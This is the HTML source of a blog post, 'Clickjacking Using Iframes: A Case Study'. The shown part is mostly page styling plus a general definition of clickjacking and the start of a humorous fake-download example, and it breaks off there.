<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><style data-href="/blog/styles.43d277d7e882244ab0fd.css">@import url(https://fonts.googleapis.com/css?family=Nunito+Sans);@import url(https://fonts.googleapis.com/css?family=Montserrat:400,700);@import url(https://fonts.googleapis.com/css?family=Noto+Serif&display=swap);.header,.nav-item a{width:100%}.header{flex-grow:1;-ms-flex-negative:0;z-index:100;margin-bottom:20px;box-shadow:0 3px 15px rgba(57,63,72,.1);background:#fff;max-height:100vh}.header-dark{background-color:rgba(0,0,0,.87)}.header-clear{background-color:transparent;box-shadow:none}.header.header-animated .header-nav{-webkit-transition:all .3s;transition:all .3s}.nav-item,.nav-menu{-webkit-transition:all .3s}.header-brand{-webkit-overflow-scrolling:touch;align-items:stretch;display:flex;flex-shrink:0;max-width:100vw;overflow-x:auto;overflow-y:hidden}.header-nav{overflow:auto}.nav-menu{-webkit-transition:all .3s;transition:all .3s}.nav-overflow-x{justify-content:inherit;overflow-x:scroll}.header-fixed{position:fixed;top:0}.nav-item{align-items:center;display:flex;flex-grow:0;flex-shrink:0;justify-content:center;-webkit-transition:all .3s;transition:all .3s;padding:0 .3rem;cursor:pointer}.header:not(.header-clear) .nav-item:not(.no-hover).hovered,.header:not(.header-clear) .nav-item:not(.no-hover):hover{-webkit-transition:all .3s;transition:all .3s;background-color:hsla(0,0%,56.5%,.15)}.header:not(.header-clear) .nav-item.active,.header:not(.header-clear) .nav-item.active:hover{background-color:hsla(0,0%,56.5%,.25)}.nav-item .dropdown-menu{background-color:#fff;position:absolute;top:95%;z-index:1000;float:left;min-width:160px;padding:5px 0;margin:2px 0 0;font-size:14px;text-align:left;list-style:none;background-clip:padding-box;border:1px solid #eee;border-radius:0 0 4px 4px;box-shadow:0 .5rem 1rem rgba(10,10,10,.1)}.header.header-clear .nav-item .dropdown-menu{border-radius:4px}.nav-item .dropdown-menu.dropdown-animated{-webkit-transition:all .2s;transition:all .2s}.nav-item.has-sub .nav-dropdown-link:after{border:2px solid #f03d4d;border-right:0;border-top:0;display:block;height:.5em;width:.5em;content:" ";-webkit-transform:rotate(-45deg);transform:rotate(-45deg);pointer-events:none;margin-top:-.435em;right:1.125em;top:50%;position:absolute}.nav-item.has-sub .nav-dropdown-link{padding-right:2.5rem;position:relative}.header-dark .dropdown-menu,.nav-item .dropdown-menu.dropdown-dark{background-color:rgba(0,0,0,.87);border:1px solid #333;color:#fff}.dropdown-menu.dropdown-shown,.nav-item.active{opacity:1}.dropdown-menu>li>a{display:block;padding:.5rem 1rem;clear:both;line-height:1.42857143;white-space:nowrap}.header-dark .dropdown-menu>li>a,.header-dark .nav-item a{color:#fff}.dropdown-menu>li{margin:0}.dropdown-menu>li,.dropdown-menu>li:hover{-webkit-transition:all .3s;transition:all .3s}.dropdown-menu>li:hover{background-color:hsla(0,0%,56.5%,.15)}.dropdown-menu>li:active{-webkit-transition:all .3s;transition:all .3s;background-color:hsla(0,0%,56.5%,.25)}.dropdown-menu>li:last-child{margin-bottom:0}.dropdown-menu .dropdown-menu-divider{border:none;background-color:hsla(0,0%,56.5%,.15);height:1px;margin:.5rem 0}.nav-btn{cursor:pointer;display:block;height:3.5rem;position:relative;width:3.5rem}@media screen and (min-width:769px){.header,.header-nav,.nav-left{display:-ms-flexbox}.header-nav,.nav-item{position:relative}.header{align-items:stretch}.header-nav{flex-grow:1;-ms-flex-negative:0;align-items:stretch;display:flex;text-align:center;width:100%;top:0;overflow:visible}.nav-left,.nav-right{-webkit-box-align:stretch;-ms-flex-align:stretch;-ms-grid-row-align:stretch;align-items:stretch;flex-basis:0;flex-grow:1;flex-shrink:0}.nav-left{display:flex;justify-content:flex-start;white-space:nowrap}.nav-center,.nav-right{display:-ms-flexbox}.nav-right{justify-content:flex-end;white-space:nowrap}.nav-center{align-items:stretch;display:flex;flex-grow:0;flex-shrink:0;justify-content:center;margin-left:auto;margin-right:auto}.nav-btn{display:none}.nav-item a{padding:.5rem 1rem}.nav-item .dropdown-menu{opacity:0;pointer-events:none}.nav-item .dropdown-menu.dropdown-animated{-webkit-transform:translateY(-5px);transform:translateY(-5px)}.nav-item .dropdown-menu.dropdown-animated.dropdown-shown,.nav-item .dropdown-menu.dropdown-shown,.nav-item.toggle-hover:hover .dropdown-animated.dropdown-menu,.nav-item.toggle-hover:hover .dropdown-menu{opacity:1;-webkit-transform:none;transform:none;pointer-events:auto}.nav-left .has-sub .dropdown-menu{left:0;right:auto}.nav-right .has-sub .dropdown-menu{left:auto;right:0}}@media screen and (max-width:768px){.header{display:flex;flex-direction:column}.header-brand .nav-item:first-child{padding:0 1rem}.header-nav.active{height:100vh}.nav-item.has-sub{display:block}.nav-item.has-sub .dropdown-menu.dropdown-shown{border-radius:0;box-shadow:none;display:block;position:relative;top:1rem;float:none;border:none;background:0 0}.nav-item.has-sub .dropdown-menu.dropdown-dark{background-color:rgba(0,0,0,.17);border:0;color:#fff}.nav-item.has-sub .dropdown-menu{display:none}.header-nav .nav-item{padding:1rem}.header-nav .nav-item>a{padding:0;width:100%}.nav-btn{cursor:pointer;display:block;position:relative;margin-left:auto}.nav-btn span{background-color:#4d565f;display:block;height:2px;left:50%;margin-left:-7px;position:absolute;top:50%;-webkit-transition:none 86ms ease-out;transition:none 86ms ease-out;-webkit-transition-property:background,left,opacity,-webkit-transform;transition-property:background,left,opacity,-webkit-transform;transition-property:background,left,opacity,transform;transition-property:background,left,opacity,transform,-webkit-transform;width:15px}.nav-btn span:first-child{margin-top:-6px}.nav-btn span:nth-child(2){margin-top:-1px}.nav-btn span:nth-child(3){margin-top:4px}.nav-btn.active span:first-child{margin-left:-5px;-webkit-transform:rotate(45deg);transform:rotate(45deg);-webkit-transform-origin:left top;transform-origin:left top}.nav-btn.active span:nth-child(2){opacity:0}.nav-btn.active span:nth-child(3){margin-left:-5px;-webkit-transform:rotate(-45deg);transform:rotate(-45deg);-webkit-transform-origin:left bottom;transform-origin:left bottom}.nav-center,.nav-left,.nav-right{overflow:hidden}}@media screen and (min-width:1003px){.header{padding:0 2rem}}.u,.utb{display:inline;position:relative}.u:after{content:"";-webkit-transition:all .3s;transition:all .3s;-webkit-backface-visibility:hidden;backface-visibility:hidden;position:absolute;height:.1rem;width:0;background:var(--cirrus-link-dark);bottom:-.25em}.u:hover:after{width:100%}.u-LR:after{left:0}.u-RL:after{right:0}.u-RL:hover:after{width:100%}.u-C:after{left:50%;-webkit-transform:translateX(-50%);transform:translateX(-50%)}.utb:after,.utb:before{content:"";-webkit-transition:all .3s;transition:all .3s;-webkit-backface-visibility:hidden;backface-visibility:hidden;position:absolute;height:.1rem;width:0;background:rgba(12,26,66,.6)}.utb:before{top:-.25em}.utb:after{bottom:-.25em}.utb:hover:after,.utb:hover:before{width:100%}.utb-LR:after,.utb-LR:before{left:0}.utb-RL:after,.utb-RL:before{right:0}.utb-C:after,.utb-C:before{left:50%;-webkit-transform:translateX(-50%);transform:translateX(-50%)}.utb-OLR:before{left:0}.utb-OLR:after,.utb-ORL:before{right:0}.utb-ORL:after{left:0}.usquare{margin-left:.4rem;position:relative;overflow:hidden}.usquare a{position:static;padding:.2rem .4rem}.usquare:after,.usquare:before{content:"";-webkit-transition:all .25s ease;transition:all .25s ease;-webkit-backface-visibility:hidden;backface-visibility:hidden;position:absolute;width:2px;width:.1 rem;height:0;background:rgba(12,26,66,.6)}.usquare:before{left:0;bottom:-.2rem}.usquare.delay:before{-webkit-transition-delay:.6s;transition-delay:.6s}.usquare:after{right:0;top:-.2rem}.usquare.delay:after{-webkit-transition-delay:.1s;transition-delay:.1s}.usquare a:before{left:0}.usquare a:after,.usquare a:before{-webkit-transition:all .25s ease;transition:all .25s ease}.usquare a:after{right:0}.usquare.delay a:after{-webkit-transition:all .25s ease .4s;transition:all .25s ease .4s}.usquare:hover:after,.usquare:hover:before{height:calc(100% + .4rem)}.usquare:hover a:after,.usquare:hover a:before{width:100%}code[class*=language-],pre[class*=language-]{color:#657b83;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:1rem;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;white-space:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-ms-hyphens:none;hyphens:none}code[class*=language-]::selection,code[class*=language-] ::selection,pre[class*=language-]::selection,pre[class*=language-] ::selection{background:#073642}pre[class*=language-]{padding:1em;margin:.5em 0;overflow:auto;border-radius:.3em}:not(pre)>code[class*=language-],pre[class*=language-]{background-color:#fdf6e3}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em}.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#93a1a1}.token.punctuation{color:#586e75}.namespace{opacity:.7}.token.boolean,.token.constant,.token.deleted,.token.number,.token.property,.token.symbol,.token.tag{color:#268bd2}.token.attr-name,.token.builtin,.token.char,.token.inserted,.token.selector,.token.string,.token.url{color:#2aa198}.token.entity{color:#657b83;background:#eee8d5}.token.atrule,.token.attr-value,.token.keyword{color:#859900}.token.class-name,.token.function{color:#b58900}.token.important,.token.regex,.token.variable{color:#cb4b16}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}pre[data-line]{position:relative;padding:1em 0 1em 3em}.line-highlight{position:absolute;left:0;right:0;padding:inherit 0;margin-top:1em;background:rgba(153,122,102,.08);background:-webkit-gradient(linear,left top,right top,color-stop(70%,rgba(153,122,102,.1)),to(rgba(153,122,102,0)));background:linear-gradient(90deg,rgba(153,122,102,.1) 70%,rgba(153,122,102,0));pointer-events:none;line-height:inherit;white-space:pre}.line-highlight:before,.line-highlight[data-end]:after{content:attr(data-start);position:absolute;top:.4em;left:.6em;min-width:1em;padding:0 .5em;background-color:rgba(153,122,102,.4);color:#f4f1ef;font:700 65%/1.5 sans-serif;text-align:center;vertical-align:.3em;border-radius:999px;text-shadow:none;box-shadow:0 1px #fff}.line-highlight[data-end]:after{content:attr(data-end);top:auto;bottom:.4em}.line-numbers .line-highlight:after,.line-numbers .line-highlight:before{content:none}pre[class*=language-].line-numbers{position:relative;padding-left:3.8em;counter-reset:linenumber}pre[class*=language-].line-numbers>code{position:relative;white-space:inherit}.line-numbers .line-numbers-rows{position:absolute;pointer-events:none;top:0;font-size:100%;left:-3.8em;width:3em;letter-spacing:-1px;border-right:1px solid #999;-webkit-user-select:none;-ms-user-select:none;user-select:none}.line-numbers-rows>span{pointer-events:none;display:block;counter-increment:linenumber}.line-numbers-rows>span:before{content:counter(linenumber);color:#999;display:block;padding-right:.8em;text-align:right}div.code-toolbar{position:relative}div.code-toolbar>.toolbar{position:absolute;top:.3em;right:.2em;-webkit-transition:opacity .3s ease-in-out;transition:opacity .3s ease-in-out;opacity:0}div.code-toolbar:hover>.toolbar{opacity:1}div.code-toolbar>.toolbar .toolbar-item{display:inline-block}div.code-toolbar>.toolbar a{cursor:pointer}div.code-toolbar>.toolbar button{background:0 0;border:0;color:inherit;font:inherit;line-height:normal;overflow:visible;padding:0;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}div.code-toolbar>.toolbar a,div.code-toolbar>.toolbar button,div.code-toolbar>.toolbar span{color:#bbb;font-size:.8em;padding:0 .5em;background:#f5f2f0;background:hsla(0,0%,87.8%,.2);box-shadow:0 2px 0 0 rgba(0,0,0,.2);border-radius:.5em}div.code-toolbar>.toolbar a:focus,div.code-toolbar>.toolbar a:hover,div.code-toolbar>.toolbar button:focus,div.code-toolbar>.toolbar button:hover,div.code-toolbar>.toolbar span:focus,div.code-toolbar>.toolbar span:hover{color:inherit;text-decoration:none}html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{color:rgba(0,0,0,.8);font-family:Nunito Sans,serif;font-weight:400;-webkit-font-kerning:normal;font-kerning:normal;-ms-font-feature-settings:"kern","liga","clig","calt";font-feature-settings:"kern","liga","clig","calt";margin:0}article,aside,details,figcaption,figure,footer,header,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block}audio:not([controls]){display:none;height:0}progress{vertical-align:baseline}[hidden],template{display:none}a{background-color:transparent;-webkit-text-decoration-skip:objects}a:active,a:hover{outline-width:0}abbr[title]{border-bottom:none;text-decoration:underline;-webkit-text-decoration:underline dotted;text-decoration:underline dotted}b,strong{font-weight:inherit;font-weight:bolder}dfn{font-style:italic}mark{background-color:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}svg:not(:root){overflow:hidden}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}figure{margin:1em 40px}hr{box-sizing:content-box;height:0;overflow:visible}button,input,optgroup,select,textarea{font:inherit;margin:0}optgroup{font-weight:700}button,input{overflow:visible}button,select{text-transform:none}[type=reset],[type=submit],button,html [type=button]{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}textarea{overflow:auto}[type=checkbox],[type=radio]{box-sizing:border-box;padding:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-cancel-button,[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-input-placeholder{color:inherit;opacity:.54}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{font:100%/1.125rem Nunito Sans,serif;box-sizing:border-box;overflow-y:scroll}*{-webkit-transition:background-color .3s ease 0s;transition:background-color .3s ease 0s}*,:after,:before{box-sizing:inherit}img{max-width:100%;padding:0;margin:0 0 1.45rem}h1{margin:0 0 1.45rem;font-size:2.25rem}h1,h2{padding:0;color:inherit;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Fira Sans,Droid Sans,Helvetica Neue,sans-serif;text-rendering:optimizeLegibility;line-height:1.1}h2{margin-left:0;margin-right:0;margin-top:0;font-size:1.62671rem}h2:last-of-type{margin-bottom:1.45rem}h2.bold{font-weight:700!important}h3{padding:0;color:inherit;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Fira Sans,Droid Sans,Helvetica Neue,sans-serif;text-rendering:optimizeLegibility;line-height:1.1;font-size:1.38316rem;margin:2.25rem 0 1.15rem}h4{font-size:1rem}h4,h5{padding:0;color:inherit;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Fira Sans,Droid Sans,Helvetica Neue,sans-serif;text-rendering:optimizeLegibility;line-height:1.1;margin:0 0 1rem;font-weight:700}h5{font-size:.85028rem}h6{padding:0;color:inherit;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Fira Sans,Droid Sans,Helvetica Neue,sans-serif;font-weight:700;text-rendering:optimizeLegibility;line-height:1.1;margin:0 0 1rem;font-size:.78405rem;font-weight:400}hgroup{padding:0;margin:0 0 1.45rem}ol,ul{padding:0;margin:0 0 1.45rem 1.45rem;list-style-position:outside;list-style-image:none}dd,dl,figure,p{padding:0;margin:0 0 1.45rem}pre{margin:0 0 1.45rem;font-size:.85rem;line-height:1.42;background:rgba(0,0,0,.04);border-radius:3px;overflow:auto;padding:1.45rem}table{font-size:1rem;line-height:1.45rem;border-collapse:collapse;width:100%}fieldset,table{padding:0;margin:0 0 1.45rem}blockquote{padding:0;margin:0 1.45rem 1.45rem}form,iframe,noscript{padding:0;margin:0 0 1.45rem}hr{padding:0;margin:0 0 calc(1.45rem - 1px);background:rgba(0,0,0,.2);border:none;height:1px}address{padding:0;margin:0 0 1.45rem}b,dt,strong,th{font-weight:700}li{margin-bottom:.725rem}ol li,ul li{padding-left:0}li>ol,li>ul{margin-left:1.45rem;margin-bottom:.725rem;margin-top:.725rem}blockquote :last-child,li :last-child,p :last-child{margin-bottom:0}li>p{margin-bottom:.725rem}code,kbd,samp{font-size:.85rem;line-height:1.45rem}abbr,abbr[title],acronym{border-bottom:1px dotted rgba(0,0,0,.5);cursor:help}abbr[title]{text-decoration:none}thead{text-align:left}td,th{text-align:left;border-bottom:1px solid rgba(0,0,0,.12);font-feature-settings:"tnum";-moz-font-feature-settings:"tnum";-ms-font-feature-settings:"tnum";-webkit-font-feature-settings:"tnum";padding:.725rem .96667rem calc(.725rem - 1px)}td:first-child,th:first-child{padding-left:0}td:last-child,th:last-child{padding-right:0}code,tt{background-color:#f5e3d7;font-family:SFMono-Regular,Consolas,Roboto Mono,Droid Sans Mono,Liberation Mono,Menlo,Courier,monospace}:not(pre)>code[class*=language-]{border-radius:3px;padding:.1875rem .25rem}pre code{background:none;line-height:1.42;padding:0;white-space:pre}tt:after,tt:before{letter-spacing:-.2em;content:" "}pre tt:after,pre tt:before{content:""}@media only screen and (max-width:480px){html{font-size:100%}}#___gatsby,[data-reactroot],body{height:100%!important}::selection{background-color:rgba(0,102,255,.25)}::-webkit-progress-bar{background:var(--nav-bg)!important}::-webkit-progress-value{background:-webkit-gradient(linear,left top,right top,from(#12c2e9),color-stop(#c471ed),to(#f64f59))!important;background:linear-gradient(90deg,#12c2e9,#c471ed,#f64f59)!important}::-moz-progress-bar{background:linear-gradient(90deg,#12c2e9,#c471ed,#f64f59)!important}.tag{color:#888}.tag.selected{color:var(--text-normal);font-weight:700}.blog-post-preview{padding-top:1rem;padding-bottom:1rem;margin-bottom:2rem}h1>*{font-size:1.2rem;-webkit-text-decoration-line:none;text-decoration-line:none}@media screen and (min-width:848px){.prologue-component{padding:2rem 4rem}}@media screen and (min-width:769px){.header-nav{padding:1rem 0}}.burger div{background:linear-gradient(-45deg,#ee7752,#e73c7e,#23a6d5,#23d5ab);background-size:400% 400%;-webkit-animation:Gradient 15s ease infinite;animation:Gradient 15s ease infinite}@-webkit-keyframes Gradient{0%{background-position:0 50%}50%{background-position:100% 50%}to{background-position:0 50%}}@keyframes Gradient{0%{background-position:0 50%}50%{background-position:100% 50%}to{background-position:0 50%}}*{color:var(--text-normal)}body{background-color:#f8f9fa;font-size:1rem;line-height:2rem}h1{font-size:2rem}h1,h2{font-weight:700;font-family:Montserrat}h2{font-size:1.75rem}h3{font-size:1.5rem;font-weight:700}h3,h4{font-family:Montserrat}h4{font-size:1.25rem}h5{font-size:1.15rem}h5,h6{font-family:Montserrat}h6{font-size:1.05rem}h1,h2{margin-top:3rem}h2.subtitle{color:var(--text-subtitle);font-family:Nunito Sans;font-weight:400;margin-top:1rem}.blog-post,.blog-posts{font-size:1.25rem;line-height:2.25rem}.nav-item{align-items:baseline;padding:0 .5rem}a{text-decoration:none}a,a:not(.utb):hover{-webkit-transition:all .2s;transition:all .2s}a:not(.utb):hover{color:var(--link-color);text-decoration:underline}.blog-post-content a{text-decoration:underline;border:none!important;border-radius:2px;background:rgba(12,26,66,.05);padding:1px 4px 2px;-webkit-transition:.2s ease;transition:.2s ease;color:var(--link-color)!important}.blog-post-content a:hover{background:rgba(250,208,50,.1);color:#eda51c!important}.prologue__social-links:hover{background-color:hsla(0,0%,53.3%,.15)}progress{left:0}blockquote{background-color:transparent;border-left:2px solid var(--border-bottom);font-family:"Noto Serif","serif";font-style:italic;padding:1rem}.gatsby-highlight>pre,code.language-text{background-color:var(--code)!important}code.language-text{color:var(--code-text)!important}.gatsby-image-wrapper{margin-bottom:2rem}.icon-container .fa{color:#fff}@media only screen and (max-width:768px){.blog-post p,div{font-size:1rem;line-height:2rem}}body{--bg:#f8f9fa;--bg-secondary:#fff;--text-normal:#222;--text-title:inherit;--text-subtitle:#888;--text-link:rgba(12,26,66,0.6);--title-link:#222;--link-color:rgba(12,26,66,0.6);--hr:#ddd;--nav-bg:hsla(0,0%,100%,0.6);--code:#fdf6e3;--code-text:#906b22;--border-bottom:#e1e1e1;--scrollbar-bg:#fcfdfd;--scrollbar-color:#c5c1b9;--scrollbar-corner-bg:#b7b7b7;--scrollbar-thumb-bg:#ddd;background-color:var(--bg)}body.dark{-webkit-font-smoothing:antialiased;--bg:#1a1c1d;--bg-secondary:#181a1b;--text-normal:hsla(0,0%,100%,0.88);--text-title:#fff;--text-subtitle:#bab5ab;--text-link:rgba(213,210,204,0.6);--title-link:#424c7d;--link-color:rgba(201,214,253,0.6)!important;--hr:#4d4d4d;--nav-bg:rgba(24,26,27,0.6);--code:#3f2f05;--code-text:#bcb7ad;--border-bottom:#393939;--scrollbar-bg:#1c1e1f;--scrollbar-color:#c5c1b9;--scrollbar-corner-bg:#181a1b;--scrollbar-thumb-bg:#2a2c2e}::-webkit-scrollbar{background-color:var(--scrollbar-bg);color:var(--scrollbar-color)}::-webkit-scrollbar-corner{background-color:var(--scrollbar-corner-bg)}::-webkit-scrollbar-thumb{background-color:var(--scrollbar-thumb-bg)}.More-module--more--qkU_6{text-align:center}.More-module--more__links--2euLb{display:flex}.More-module--more__title--3ohFo{font-weight:700;letter-spacing:.5rem;margin-bottom:2rem;text-transform:uppercase}.More-module--morelink--1Fzl5{background-color:var(--bg-secondary);flex-basis:0;flex-grow:1;padding:1rem}.More-module--morelink__title--3hNp9{font-family:Montserrat,"serif";font-weight:700;margin-bottom:0;text-transform:uppercase}.More-module--morelink__subtitle--3Hn73{color:#888;font-family:Montserrat,"serif";font-size:.9rem;margin-bottom:.25rem}.More-module--morelink__description--2qmqV{font-size:.95rem;line-height:1.25rem}.Share-module--share--3hhFg{padding:1rem}.Share-module--share__container--_nRPy{display:flex;margin-bottom:3rem;margin-top:2rem}.Share-module--share__title--2Zlwv{font-weight:700;letter-spacing:.5rem;text-align:center;text-transform:uppercase}.Share-module--sharebtn__facebook--2eSJE{background-color:#3b5998;flex:1 1;text-align:center}.Share-module--sharebtn__twitter--3CWNs{background-color:#1da1f2;flex:1 1;text-align:center}.Share-module--sharebtn__linkedin--2urSS{background-color:#0077b5;flex:1 1;text-align:center}.Share-module--sharebtn__reddit--270gh{background-color:#ff4500;flex:1 1;text-align:center}[class*=sharebtn]:hover{box-shadow:0 10px 20px 0 rgba(1,1,1,.15)}</style><meta name="generator" content="Gatsby 2.18.25"/><title data-react-helmet="true">slim - Clickjacking Using Iframes: A Case Study</title><link data-react-helmet="true" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"/><meta data-react-helmet="true" name="title" content="Clickjacking Using Iframes: A Case Study"/><meta data-react-helmet="true" name="description" content="Having been around since 2002, Clickjacking or &#x27;UI redressing&#x27; is technique that utilizes multiple opaque or transparent layers, usually iframes, to trick users into clicking buttons or entering information without any malicious intent."/><meta data-react-helmet="true" name="keywords" content="stanley, lim, blog, security,clickjacking,attacks"/><meta data-react-helmet="true" property="og:title" content="Clickjacking Using Iframes: A Case Study"/><meta data-react-helmet="true" property="og:url" content="https://spiderpig86.github.io/blog/clickjacking-using-iframes:-a-case-study"/><meta data-react-helmet="true" property="og:image"/><meta data-react-helmet="true" property="og:image:secure_url"/><meta data-react-helmet="true" property="og:description" content="Having been around since 2002, Clickjacking or &#x27;UI redressing&#x27; is technique that utilizes multiple opaque or transparent layers, usually iframes, to trick users into clicking buttons or entering information without any malicious intent."/><meta data-react-helmet="true" property="og:image:width" content="1200"/><meta data-react-helmet="true" property="og:image:height" content="630"/><meta data-react-helmet="true" property="og:locale" content="en"/><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"/><meta data-react-helmet="true" name="twitter:title" content="Clickjacking Using Iframes: A Case Study"/><meta data-react-helmet="true" name="twitter:description" content="Having been around since 2002, Clickjacking or &#x27;UI redressing&#x27; is technique that utilizes multiple opaque or transparent layers, usually iframes, to trick users into clicking buttons or entering information without any malicious intent."/><meta data-react-helmet="true" property="og:type" content="website"/><meta data-react-helmet="true" name="robots" content="index, follow"/><meta data-react-helmet="true" name="twitter:creator" content="@hudididudidi"/><meta data-react-helmet="true" property="og:site_name" content="slim blog"/><meta data-react-helmet="true" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/><link rel="manifest" href="/blog/manifest.webmanifest" crossorigin="use-credentials"/><meta name="theme-color" content="#6b37bf"/><link rel="apple-touch-icon" sizes="48x48" href="/blog/icons/icon-48x48.png"/><link rel="apple-touch-icon" sizes="72x72" href="/blog/icons/icon-72x72.png"/><link rel="apple-touch-icon" sizes="96x96" href="/blog/icons/icon-96x96.png"/><link rel="apple-touch-icon" sizes="144x144" href="/blog/icons/icon-144x144.png"/><link rel="apple-touch-icon" sizes="192x192" href="/blog/icons/icon-192x192.png"/><link rel="apple-touch-icon" sizes="256x256" href="/blog/icons/icon-256x256.png"/><link rel="apple-touch-icon" sizes="384x384" href="/blog/icons/icon-384x384.png"/><link rel="apple-touch-icon" sizes="512x512" href="/blog/icons/icon-512x512.png"/><link as="script" rel="preload" href="/blog/webpack-runtime-b8a814a91ec106d5d372.js"/><link as="script" rel="preload" href="/blog/app-77af9155c03470a30bba.js"/><link as="script" rel="preload" href="/blog/styles-ddd3856516bfb2b8e9af.js"/><link as="script" rel="preload" href="/blog/commons-c915896a95d3515d63cd.js"/><link as="script" rel="preload" href="/blog/component---src-templates-post-template-js-f58517086d391b5adabe.js"/><link as="fetch" rel="preload" href="/blog/page-data/clickjacking-using-iframes:-a-case-study/page-data.json" crossorigin="anonymous"/></head><body><script>
void function() {
  window.__onThemeChange = function() {}

  var preferredTheme
  try {
    preferredTheme = localStorage.getItem('theme')
  } catch (err) { }

  function setTheme(newTheme) {
    if (preferredTheme && document.body.classList.contains(preferredTheme)) {
      document.body.classList.replace(preferredTheme, newTheme)
    } else {
      document.body.classList.add(newTheme)
    }

    window.__theme = newTheme
    preferredTheme = newTheme
    window.__onThemeChange(newTheme)
  }

  window.__setPreferredTheme = function(newTheme) {
    setTheme(newTheme)
    try {
      localStorage.setItem('theme', newTheme)
    } catch (err) {}
  }

  var darkQuery = window.matchMedia('(prefers-color-scheme: dark)')
  darkQuery.addListener(function(e) {
    window.__setPreferredTheme(e.matches ? 'dark' : 'light')
  })

  setTheme(preferredTheme || (darkQuery.matches ? 'dark' : 'light'))
}()
    </script><div id="___gatsby"><div style="outline:none" tabindex="-1" role="group" id="gatsby-focus-wrapper"><div><div class="header header-fixed header-clear" style="background-color:var(--nav-bg);backdrop-filter:blur(5px);border-bottom:1px solid var(--border-bottom);box-shadow:0 0.2rem 1.25rem 0 rgba(27,30,36,.07)"><div style="background:transparent;margin:0 auto;padding:0 1.0875rem"><div class="header-nav" style="background:transparent"><div class="nav-left"><div class="nav-item"><h1 style="display:flex;margin:0;text-align:center;background:transparent"><label style="cursor:pointer;position:relative;display:flex;align-items:center"><input type="checkbox" style="opacity:0;position:absolute"/> <!-- -->☀️</label><a class="header-brand" style="color:var(--text-title);text-decoration:none;width:inherit" href="/blog/">slim</a></h1></div></div><div class="nav-center"></div><div class="nav-right" style="display:flex"><div class="nav-item"><div class="burger" style="background:transparent;display:flex;flex-direction:column;padding-top:3px;right:0"><div style="height:4px;border-radius:4px;margin-top:.15rem;margin-bottom:.15rem;padding-top:3px;width:15px;align-self:flex-end"></div><div style="height:4px;border-radius:4px;margin-top:.15rem;margin-bottom:.15rem;padding-top:3px;width:30px"></div><div style="height:4px;border-radius:4px;margin-top:.15rem;margin-bottom:.15rem;padding-top:3px;width:15px"></div></div></div></div></div></div></div><div style="margin:0 auto;padding-top:7rem;max-width:1130px;flex-direction:row;justify-content:space-between;height:100%"><div id="post-container" style="margin:0 auto;max-width:1130px;display:flex;flex-direction:row;justify-content:space-between;height:100%;padding:25px"><div style="flex:1;max-width:100%"><progress value="0" max="0" class="sc-bdVaJa dIVpUj"></progress><div style="padding-right:2rem;max-width:100%;min-width:0"><div class="blog-post"><h1 style="font-size:3rem">Clickjacking Using Iframes: A Case Study</h1><h2 class="subtitle">Having been around since 2002, Clickjacking or &#x27;UI redressing&#x27; is technique that utilizes multiple opaque or transparent layers, usually iframes, to trick users into clicking buttons or entering information without any malicious intent.</h2><hr style="background-color:var(--hr);margin-bottom:3rem"/><div class="blog-post-content" id="post-el"><h2>What is it?</h2>
<p>Having been around since 2002, Clickjacking or "UI redressing" is a technique that utilizes multiple opaque or transparent layers, usually iframes, to trick users into clicking buttons or entering information without any malicious intent. In turn, the content rendered in these frames could lead to malicious content on another page (masking as a legitimate download site, banking site, etc.) Typically, these attacks are carried out by those who own the domain and set up a website for malicious purposes. The other way that this type of attack can work is if an attacker takes over an expired domain or the hacker somehow accesses your web hosting account, CMS, etc. (if this happens, you may want to consider changing your credentials for every account you own).</p>
<h2>An Example</h2>
<p>Sounds a bit confusing? Let's use a simple example. You want to download an unreleased version of <em>The Room 2</em>, the sequel to Tommy Wiseau's masterpiece from 2003. You know of a way to get the movie from a <em>safe</em> and <em>legitimate</em> website in a <em>totally legal 100%</em> way on <a href="http://totallylegitsafemoviedownload.com/" target="_blank" rel="noopener noreferrer">http://totallylegitsafemoviedownload.com</a>. Now you must be thinking, there shouldn't be any issues given that the word "safe" is in the name. It probably uses ad revenue to plant trees around the world ravaged by illegal deforestation and totally does not track and store your information to later resell it for profit. Given these assumptions, you reassure yourself it'll all be ok to click the big green flashing DOWNLOAD NOW button because nothing screams free movie plus a side of adware more than this.</p>
